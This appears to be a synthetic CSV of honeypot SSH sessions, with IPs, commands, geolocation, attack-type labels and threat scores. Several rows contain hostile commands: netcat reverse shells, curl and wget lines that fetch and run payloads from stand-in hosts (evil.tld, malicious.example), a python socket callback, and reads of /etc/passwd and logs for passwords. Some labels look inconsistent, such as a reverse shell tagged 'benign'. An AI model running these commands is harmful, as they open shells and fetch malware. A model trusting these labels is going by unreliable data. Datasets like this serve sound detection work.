session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10044,176.174.6.218,2025-10-04T21:14:19.746466Z,postgres,nc -e /bin/sh 10.10.10.5 4444,4,1,0,,48.440189,1.963564,FR,payload_exec,0.13
sess_10016,110.135.232.74,2025-10-04T21:15:07.746466Z,unknown,cat /etc/passwd | grep root; whoami; pwd; ls -la,1,4,0,,35.987071,139.160298,JP,benign,0.145
sess_10039,180.13.42.165,2025-10-04T21:16:39.746466Z,test,ls -la; id; uname -a,0,3,0,,-23.237024,-46.778349,BR,benign,0.09
sess_10013,59.48.49.169,2025-10-04T21:17:19.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; ls -la; id; uname -a,0,4,0,,28.887756,77.569711,IN,benign,0.12
sess_10045,144.138.247.120,2025-10-04T21:18:33.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; find / -maxdepth 2 -type f | head -n 20,0,2,0,,52.47765,13.537398,DE,benign,0.06
sess_10176,201.177.27.26,2025-10-04T21:18:58.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x; echo 'hello' > /tmp/x; cat /tmp/x,0,4,0,,35.850448,140.031958,JP,benign,0.12
sess_10053,144.194.230.233,2025-10-04T21:20:30.746466Z,guest,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,5,5,0,,28.263245,76.86223,IN,benign,0.275
sess_10079,82.16.189.56,2025-10-04T21:20:41.746466Z,postgres,ls -la; id; uname -a; python3 -c 'print(2+2)',0,4,0,,-23.672732,-47.00553,BR,benign,0.12
sess_10083,118.58.32.122,2025-10-04T21:22:01.746466Z,unknown,ps aux | grep sshd,2,1,0,,29.104402,77.399684,IN,benign,0.08
sess_10147,165.54.171.73,2025-10-04T21:23:41.746466Z,www-data,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,3,2,0,,37.363321,127.255343,KR,benign,0.135
sess_10136,193.170.242.133,2025-10-04T21:24:24.746466Z,test,whoami; pwd; ls -la,6,3,0,,35.976683,139.450781,JP,benign,0.24
sess_10099,25.180.37.80,2025-10-04T21:25:42.746466Z,postgres,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,-23.124148,-46.49529,BR,reverse_shell,0.03
sess_10003,173.87.125.42,2025-10-04T21:25:50.746466Z,oracle,python3 -c 'print(2+2)',0,1,0,,28.05242,76.987544,IN,benign,0.03
sess_10154,117.233.29.144,2025-10-04T21:25:52.746466Z,www-data,ps aux | grep sshd,1,1,0,,48.310948,2.165635,FR,benign,0.055
sess_10162,68.153.73.207,2025-10-04T21:26:03.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root,2,3,0,,56.262471,38.03386,RU,benign,0.14
sess_10165,72.164.144.98,2025-10-04T21:26:56.746466Z,ftp,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,6,5,0,,52.483389,13.812677,DE,recon,0.3
sess_10114,140.10.199.224,2025-10-04T21:27:59.746466Z,root,whoami; pwd; ls -la; ls -la; id; uname -a,2,6,0,,49.010508,2.678002,FR,benign,0.23
sess_10084,88.234.15.16,2025-10-04T21:30:24.746466Z,oracle,ps aux | grep sshd,0,1,0,,48.986557,1.831019,FR,recon,0.03
sess_10071,88.101.196.219,2025-10-04T21:31:33.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,2,3,0,,51.236776,-0.048685,GB,benign,0.14
sess_10125,62.71.121.203,2025-10-04T21:34:31.746466Z,root,ps aux | grep sshd; grep -R 'password' /var/log || true,0,2,0,,52.397792,13.66532,DE,benign,0.06
sess_10173,25.4.87.22,2025-10-04T21:36:06.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,0,3,0,,28.2676,77.65074,IN,benign,0.09
sess_10139,49.211.104.106,2025-10-04T21:36:38.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; python3 -c 'print(2+2)',0,2,0,,-23.760441,-46.438628,BR,recon,0.06
sess_10110,17.212.27.102,2025-10-04T21:36:41.746466Z,pi,whoami; pwd; ls -la; nc -lvp 4444 &,3,4,0,,37.954853,-122.069743,US,benign,0.195
sess_10127,223.93.66.111,2025-10-04T21:36:55.746466Z,root,whoami; pwd; ls -la,0,3,0,,38.10348,127.000677,KR,benign,0.09
sess_10012,28.16.169.19,2025-10-04T21:40:00.746466Z,ubuntu,cat /etc/passwd | grep root; cat /etc/passwd | grep root,1,2,0,,56.097343,37.986296,RU,benign,0.085
sess_10031,132.86.43.73,2025-10-04T21:40:22.746466Z,www-data,ls -la; id; uname -a; grep -R 'password' /var/log || true,3,4,0,,51.084225,-0.672344,GB,benign,0.195
sess_10085,81.166.195.153,2025-10-04T21:44:29.746466Z,guest,ls -la; id; uname -a; python3 -c 'print(2+2)',3,4,0,,52.785008,13.063028,DE,benign,0.195
sess_10170,179.249.8.2,2025-10-04T21:44:56.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,38.150689,-122.21056,US,benign,0.06
sess_10049,60.161.61.191,2025-10-04T21:45:56.746466Z,unknown,cat /etc/passwd | grep root,6,1,0,,-23.520936,-46.893702,BR,benign,0.18
sess_10014,38.127.98.49,2025-10-04T21:46:03.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:d35b4af616df73e393019c5c99041648956324c6ba59d3b17ad95d319b378f97,49.226227,2.77936,FR,reverse_shell,0.555
sess_10076,213.202.7.68,2025-10-04T21:46:08.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,0,3,0,,35.11953,140.152782,JP,recon,0.09
sess_10143,133.109.103.212,2025-10-04T21:46:41.746466Z,guest,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,2,3,0,,28.65115,77.374533,IN,benign,0.14
sess_10124,92.177.33.141,2025-10-04T21:47:39.746466Z,guest,python3 -c 'print(2+2)',3,1,0,,48.867107,1.897835,FR,benign,0.105
sess_10020,83.80.224.214,2025-10-04T21:47:57.746466Z,unknown,python3 -c 'print(2+2)',0,1,0,,38.228652,-122.702041,US,benign,0.03
sess_10070,216.238.147.174,2025-10-04T21:48:52.746466Z,test,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,38.003276,-122.471197,US,payload_exec,0.03
sess_10030,108.89.154.104,2025-10-04T21:49:14.746466Z,root,ps aux | grep sshd,1,1,0,,37.705492,-122.762958,US,benign,0.055
sess_10167,69.194.125.128,2025-10-04T21:49:58.746466Z,www-data,whoami; pwd; ls -la; find / -maxdepth 2 -type f | head -n 20,1,4,0,,37.16838,127.331971,KR,benign,0.145
sess_10064,148.247.176.86,2025-10-04T21:50:19.746466Z,unknown,grep -R 'password' /var/log || true; find / -maxdepth 2 -type f | head -n 20,0,2,0,,49.283816,2.24513,FR,benign,0.06
sess_10023,49.18.189.150,2025-10-04T21:50:29.746466Z,test,whoami; pwd; ls -la,4,3,0,,29.09261,76.861092,IN,benign,0.19
sess_10177,126.251.116.92,2025-10-04T21:50:37.746466Z,oracle,ls -la; id; uname -a; echo 'hello' > /tmp/x; cat /tmp/x,0,5,0,,37.151565,127.232013,KR,benign,0.15
sess_10100,140.196.236.149,2025-10-04T21:50:58.746466Z,unknown,ps aux | grep sshd,0,1,0,,37.745655,-122.838367,US,benign,0.03
sess_10024,74.52.181.200,2025-10-04T21:52:30.746466Z,oracle,grep -R 'password' /var/log || true,3,1,0,,48.469063,2.246953,FR,benign,0.105
sess_10009,72.29.123.225,2025-10-04T21:54:32.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,-23.999587,-46.441599,BR,malware_fetch,0.24
sess_10126,133.210.209.211,2025-10-04T21:56:36.746466Z,admin,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,35.710332,139.245702,JP,payload_exec,0.03
sess_10028,166.59.197.231,2025-10-04T21:57:03.746466Z,ubuntu,ls -la; id; uname -a; grep -R 'password' /var/log || true,2,4,0,,40.108954,116.244466,CN,benign,0.17
sess_10048,188.124.156.170,2025-10-04T21:58:25.746466Z,pi,ps aux | grep sshd; python3 -c 'print(2+2)',0,2,0,,39.605884,115.952187,CN,benign,0.06
sess_10103,75.76.170.21,2025-10-04T21:58:44.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,28.48425,77.323049,IN,reverse_shell,0.18
sess_10133,111.234.123.56,2025-10-04T21:58:54.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,1,1,0,,28.820925,76.951898,IN,reverse_shell,0.055
sess_10005,148.134.219.230,2025-10-04T21:58:57.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,52.672935,13.755495,DE,recon,0.06
sess_10058,177.226.142.47,2025-10-04T21:59:27.746466Z,oracle,grep -R 'password' /var/log || true; ps aux | grep sshd,0,2,0,,39.49719,116.301374,CN,benign,0.06
sess_10006,119.32.197.98,2025-10-04T22:02:20.746466Z,postgres,python3 -c 'print(2+2)',3,1,0,,36.011818,139.499911,JP,benign,0.105
sess_10021,38.79.139.73,2025-10-04T22:04:46.746466Z,ubuntu,python3 -c 'print(2+2)',0,1,0,,51.997191,-0.666841,GB,benign,0.03
sess_10151,187.60.151.95,2025-10-04T22:07:27.746466Z,ubuntu,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:f9ef7039029eab4b2333e51eb3105d285addf766a0da7171085276fa206e1595,51.406415,-0.068719,GB,reverse_shell,0.53
sess_10019,91.37.4.118,2025-10-04T22:09:14.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,-24.06795,-46.940159,BR,recon,0.06
sess_10073,179.70.49.232,2025-10-04T22:10:57.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,28.12206,76.963133,IN,malware_fetch,0.115
sess_10128,83.40.128.51,2025-10-04T22:13:01.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x; ls -la; id; uname -a,1,5,0,,39.509641,116.556775,CN,benign,0.175
sess_10002,36.194.142.117,2025-10-04T22:13:12.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,55.976057,37.102983,RU,malware_fetch,0.08
sess_10018,74.20.41.108,2025-10-04T22:19:07.746466Z,user,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,0,2,0,,40.110228,116.167396,CN,benign,0.06
sess_10025,56.170.210.206,2025-10-04T22:22:32.746466Z,unknown,cat /etc/passwd | grep root; python3 -c 'print(2+2)',1,2,0,,52.159487,13.907142,DE,recon,0.085
sess_10068,36.51.227.43,2025-10-04T22:29:07.746466Z,guest,whoami; pwd; ls -la; nc -lvp 4444 &,1,4,0,,39.597237,116.301862,CN,benign,0.145
sess_10043,61.38.124.27,2025-10-04T22:29:59.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20,1,1,0,,28.807726,76.691748,IN,recon,0.055
sess_10172,114.235.124.254,2025-10-04T22:30:00.746466Z,ubuntu,python3 -c 'print(2+2)',0,1,0,,55.610917,37.680542,RU,benign,0.03
sess_10144,24.51.211.85,2025-10-04T22:35:30.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,6,1,1,sha256:ead41ceb4ee9c8d32890983cc342a1b2d5605c3d9dafee96b1c27d2c4a0bf717,49.040071,2.808977,FR,malware_fetch,0.68
sess_10067,95.194.162.161,2025-10-04T22:35:52.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,37.239484,126.486455,KR,benign,0.06
sess_10047,13.97.43.62,2025-10-04T22:36:14.746466Z,oracle,python3 -c 'print(2+2)',3,1,0,,37.078164,126.643916,KR,benign,0.105
sess_10066,123.51.233.4,2025-10-04T22:36:53.746466Z,test,ls -la; id; uname -a,2,3,0,,35.56648,139.188078,JP,benign,0.14
sess_10148,176.131.95.4,2025-10-04T22:40:45.746466Z,pi,cat /etc/passwd | grep root,3,1,0,,39.922537,115.911485,CN,benign,0.105
sess_10152,131.111.126.175,2025-10-04T22:45:42.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x,5,2,0,,55.290451,38.011829,RU,benign,0.185
sess_10059,137.147.205.209,2025-10-04T22:47:17.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:8e8c6cb11a6c1e3300b3dde28fdaa6665e2b21d2f0b2dbd1c0a2ded17ac73707,-23.112607,-46.243387,BR,reverse_shell,0.715
sess_10158,39.16.214.158,2025-10-04T22:48:48.746466Z,root,ls -la; id; uname -a; nc -lvp 4444 &,2,4,0,,39.362612,116.696049,CN,benign,0.17
sess_10104,32.158.192.165,2025-10-04T22:55:47.746466Z,pi,python3 -c 'print(2+2)',0,1,0,,48.472916,2.009231,FR,benign,0.03
sess_10052,172.27.77.39,2025-10-04T23:01:06.746466Z,user,grep -R 'password' /var/log || true,2,1,0,,56.104689,37.288125,RU,benign,0.08
sess_10034,154.162.226.157,2025-10-04T23:02:10.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; echo 'hello' > /tmp/x; cat /tmp/x,1,3,0,,48.56763,2.048888,FR,benign,0.115
sess_10137,97.250.153.122,2025-10-04T23:02:22.746466Z,root,grep -R 'password' /var/log || true,2,1,0,,37.792152,126.409977,KR,benign,0.08
sess_10042,105.85.58.200,2025-10-04T23:03:20.746466Z,test,echo 'hello' > /tmp/x; cat /tmp/x,4,2,0,,55.606168,38.147065,RU,benign,0.16
sess_10086,126.116.211.87,2025-10-04T23:05:33.746466Z,postgres,whoami; pwd; ls -la,5,3,0,,35.913685,139.660821,JP,benign,0.215
sess_10111,46.19.146.235,2025-10-04T23:06:11.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20,4,1,0,,50.930205,-0.469014,GB,benign,0.13
sess_10062,194.149.139.107,2025-10-04T23:07:33.746466Z,postgres,ps aux | grep sshd,1,1,0,,56.051351,37.18111,RU,benign,0.055
sess_10029,28.169.160.170,2025-10-04T23:11:10.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',1,3,0,,-23.920292,-46.435385,BR,benign,0.115
sess_10046,108.172.14.127,2025-10-04T23:11:59.746466Z,pi,curl -s http://evil.tld/payload.sh | sh,3,1,1,sha256:1c5be1c7201c7a15b00726e4e8fdabddd32cfb0208d14ef43c9b00bc7f9fdb96,35.930921,139.423222,JP,reverse_shell,0.605
sess_10117,176.97.146.92,2025-10-04T23:15:02.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,37.490842,126.858026,KR,reverse_shell,0.09
sess_10129,165.172.21.212,2025-10-04T23:15:29.746466Z,root,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,5,3,0,,-23.463935,-46.49157,BR,payload_exec,0.215
sess_10132,109.214.127.247,2025-10-04T23:15:54.746466Z,test,cat /etc/passwd | grep root; cat /etc/passwd | grep root,4,2,0,,55.752644,37.125359,RU,benign,0.16
sess_10082,215.89.56.170,2025-10-04T23:16:12.746466Z,root,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,55.474241,37.16941,RU,malware_fetch,0.18
sess_10156,118.191.195.115,2025-10-04T23:17:04.746466Z,oracle,python3 -c 'print(2+2)',1,1,0,,35.724111,139.96513,JP,benign,0.055
sess_10081,152.106.110.209,2025-10-04T23:17:06.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,6,1,0,,52.092433,-0.079541,GB,benign,0.18
sess_10090,97.179.3.47,2025-10-04T23:17:08.746466Z,test,ls -la; id; uname -a; python3 -c 'print(2+2)',1,4,0,,37.626333,-122.475025,US,recon,0.145
sess_10010,151.84.135.136,2025-10-04T23:17:50.746466Z,user,grep -R 'password' /var/log || true,2,1,0,,37.653691,-122.213376,US,benign,0.08
sess_10160,208.164.121.78,2025-10-04T23:18:53.746466Z,test,ps aux | grep sshd,1,1,0,,38.057155,-122.80924,US,benign,0.055
sess_10027,113.169.14.30,2025-10-04T23:19:06.746466Z,guest,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,37.840754,126.754413,KR,malware_fetch,0.03
sess_10134,13.55.220.35,2025-10-04T23:20:35.746466Z,guest,whoami; pwd; ls -la; ps aux | grep sshd,1,4,0,,48.344838,2.357307,FR,benign,0.145
sess_10032,132.37.233.107,2025-10-04T23:21:35.746466Z,www-data,ps aux | grep sshd; cat /etc/passwd | grep root,3,2,0,,56.079855,37.145205,RU,recon,0.135
sess_10101,26.230.52.208,2025-10-04T23:25:08.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x,1,2,0,,51.434706,-0.100502,GB,benign,0.085
sess_10072,186.25.254.214,2025-10-04T23:26:30.746466Z,guest,echo 'hello' > /tmp/x; cat /tmp/x,2,2,0,,55.969117,37.882414,RU,benign,0.11
sess_10109,32.82.139.116,2025-10-04T23:26:49.746466Z,ftp,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",10,3,0,,-23.609146,-46.813798,BR,malware_fetch,0.34
sess_10168,54.71.250.48,2025-10-04T23:29:59.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x,3,2,0,,39.362417,115.815061,CN,recon,0.135
sess_10146,55.213.90.240,2025-10-04T23:30:44.746466Z,root,find / -maxdepth 2 -type f | head -n 20; cat /etc/passwd | grep root,0,2,0,,35.134459,139.449771,JP,benign,0.06
sess_10098,137.237.229.175,2025-10-04T23:31:58.746466Z,user,find / -maxdepth 2 -type f | head -n 20; python3 -c 'print(2+2)',1,2,0,,39.667585,116.137008,CN,recon,0.085
sess_10174,156.243.138.12,2025-10-04T23:31:58.746466Z,admin,grep -R 'password' /var/log || true; echo 'hello' > /tmp/x; cat /tmp/x; nc -lvp 4444 &,0,4,0,,49.410363,2.456643,FR,benign,0.12
sess_10155,27.30.35.253,2025-10-04T23:34:35.746466Z,postgres,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",3,3,0,,53.094,13.580057,DE,malware_fetch,0.165
sess_10063,28.141.212.88,2025-10-04T23:34:43.746466Z,unknown,whoami; pwd; ls -la,6,3,0,,28.601468,76.787315,IN,benign,0.24
sess_10164,96.155.7.55,2025-10-04T23:35:31.746466Z,ubuntu,python3 -c 'print(2+2)',2,1,0,,49.101122,2.228158,FR,benign,0.08
sess_10141,74.142.152.58,2025-10-04T23:36:42.746466Z,guest,python3 -c 'print(2+2)',1,1,0,,52.028782,0.138197,GB,benign,0.055
sess_10037,206.194.244.2,2025-10-04T23:37:02.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; grep -R 'password' /var/log || true,1,2,0,,37.690403,126.642646,KR,benign,0.085
sess_10004,79.33.108.234,2025-10-04T23:37:05.746466Z,user,cat /etc/passwd | grep root; ps aux | grep sshd,0,2,0,,48.424156,2.646187,FR,benign,0.06
sess_10130,18.254.148.165,2025-10-04T23:40:50.746466Z,guest,whoami; pwd; ls -la; ls -la; id; uname -a; nc -lvp 4444 &,1,7,0,,37.419728,-122.291408,US,benign,0.235
sess_10033,119.112.90.206,2025-10-04T23:41:12.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,28.571472,77.246358,IN,recon,0.06
sess_10017,160.244.80.15,2025-10-04T23:41:58.746466Z,ftp,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:695ab9d99153100eb73e0eb2d7c710a90d4139fae3488060d6b7d8fdf9be783a,37.110364,127.446345,KR,malware_fetch,0.555
sess_10057,75.13.46.59,2025-10-04T23:42:16.746466Z,www-data,grep -R 'password' /var/log || true,0,1,0,,37.874023,126.942601,KR,benign,0.03
sess_10075,202.173.58.120,2025-10-04T23:42:33.746466Z,admin,curl -s http://evil.tld/payload.sh | sh,2,1,1,sha256:9248fa35b630bd1141d3f653f7090b7d95ed20a5e47befb6326b082f9d0a24a2,52.885505,13.24393,DE,payload_exec,0.58
sess_10145,132.244.102.194,2025-10-04T23:42:49.746466Z,guest,grep -R 'password' /var/log || true,1,1,0,,52.787741,13.929003,DE,benign,0.055
sess_10161,184.218.253.13,2025-10-04T23:45:07.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,0,4,0,,51.812699,-0.159577,GB,recon,0.12
sess_10135,206.143.60.33,2025-10-04T23:45:52.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,1,5,0,,51.968306,12.851697,DE,benign,0.175
sess_10120,168.222.140.164,2025-10-04T23:47:13.746466Z,unknown,python3 -c 'print(2+2)',2,1,0,,37.366884,-122.982031,US,benign,0.08
sess_10142,84.62.194.230,2025-10-04T23:47:15.746466Z,oracle,whoami; pwd; ls -la,0,3,0,,55.686651,37.325033,RU,benign,0.09
sess_10065,92.242.195.99,2025-10-04T23:49:31.746466Z,www-data,ps aux | grep sshd; nc -lvp 4444 &,1,2,0,,52.96364,13.854028,DE,benign,0.085
